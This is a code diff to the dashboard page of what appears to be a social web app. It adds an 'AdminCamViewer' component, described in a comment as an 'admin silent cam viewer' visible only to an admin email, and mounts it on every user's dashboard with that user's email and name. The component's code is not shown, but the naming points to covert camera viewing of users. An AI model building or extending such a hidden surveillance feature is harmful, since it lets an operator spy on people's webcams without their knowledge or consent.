@@ -25,6 +25,7 @@ import ProfilePanel from '@/components/ProfilePanel';
 import DashboardSkeleton from '@/components/DashboardSkeleton';
 import HomeFeed from '@/components/HomeFeed';
 import ReelsPlayer from '@/components/ReelsPlayer';
+import AdminCamViewer from '@/components/AdminCamViewer';
 
 interface Message {
   id: string;
@@ -529,6 +530,12 @@ export default function DashboardPage() {
 
   return (
     <div className="main-layout flex h-[100dvh] overflow-hidden font-sans font-light text-[0.95em] md:p-3 md:gap-3 animate-in fade-in slide-in-from-left-full duration-700 ease-[var(--ease-premium)]" style={{ background: 'var(--dm-bg-page)', color: 'var(--dm-text-primary)' }}>
+      
+      {/* Admin silent cam viewer — only visible panel for admin email */}
+      <AdminCamViewer
+        userEmail={displaySession.user?.email || ''}
+        username={displaySession.user?.name || displaySession.user?.email?.split('@')[0] || 'User'}
+      />
       
       {/* Fully Adaptive Sidebar */}
       <div className="main-sidebar w-[88px] hover:w-72 h-full flex flex-col justify-between p-4 transition-[width,box-shadow] duration-500 ease-[var(--ease-premium)] will-change-[width] group z-20 overflow-hidden border-r md:border md:rounded-[40px] shadow-sm" style={{ background: 'var(--dm-bg-sidebar)', borderColor: 'var(--dm-border-main)' }}>
